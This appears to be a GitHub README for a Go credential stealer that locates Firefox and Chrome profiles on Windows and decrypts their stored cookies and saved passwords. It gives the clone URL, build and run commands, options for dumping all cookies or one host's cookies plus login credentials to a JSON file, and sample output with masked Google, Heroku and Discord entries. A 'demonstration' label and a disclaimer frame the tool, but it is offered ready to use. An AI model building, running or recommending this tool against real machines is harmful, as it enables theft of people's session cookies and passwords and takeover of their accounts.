# Golang Credential Stealer
Demonstration of gaining access into cookies & login credentials. Currently only supports firefox & chrome, planning to support edge but i have no interest in any other browser since the main purpose of this repo is just as demonstration.

Special thanks to [@lclevy](https://github.com/lclevy) for their implementation of credential decrypting, all algorithms I use for decrypting firefox login credentials are just replica of [Firepwd](https://github.com/lclevy/firepwd). I just rewrite it completely in go.

Please note that any illegal action related to this program is highly discouraged, it is user's resposibility for anything done with this distribution and has nothing to do with me.

> Currently only windows is supported, and older version of firefox / chrome might be incompatible (this is intentional since most people don't use older browser anyway).
## Building
Install go compiler, > 1.18 if possible, but any version above 1.0 seems fine.
```bash
> go version
go version go1.18 windows/amd64
```

Clone this repository.
```bash
git clone https://github.com/idfp/go-stealer
```
Install required dependencies, then build it or just run as it is.
```
go build .
```

## Usage
```bash
go-stealer.exe [Options]
or
go run . [Options]
```
There's no need to pass profile directory, the program will find it by its own.

### Options
```bash
--browser               Targeted browser, by default the value is "firefox".
-b                      Shorthand for --browser.

--check-credentials     Check login credentials, by default this is turned off.
-c                      Shorthand for --check-credentials.

--dump-all              Dump all cookies instead of just a specific host, --output is required for this.
-a                      Shorthand for --dump-all

--output                JSON File to save all logged credentials.
-o                      You guessed it.

--web                   Specific host to look for when doing cookies logging.
-w                      Yes
```

### Example Usage
This is how the result will looks like, of course the private data is censored.
```bash
> go-stealer.exe -a -c -o result.json
Opening SQL File
accounts.google.com @ SMSV : [REDACTED]
.developers.google.com @ _ga : [REDACTED]
accounts.google.com @ ACCOUNT_CHOOSER : [REDACTED]
.google.com @ ANID : [REDACTED]
.fonts.google.com @ _ga : [REDACTED]

...

Site: https://id.heroku.com 
Username: ri******@gmail.com
Password: ******

Site: https://discord.com 
Username: ri******@gmail.com
Password: ******

Saving all result to result.json
```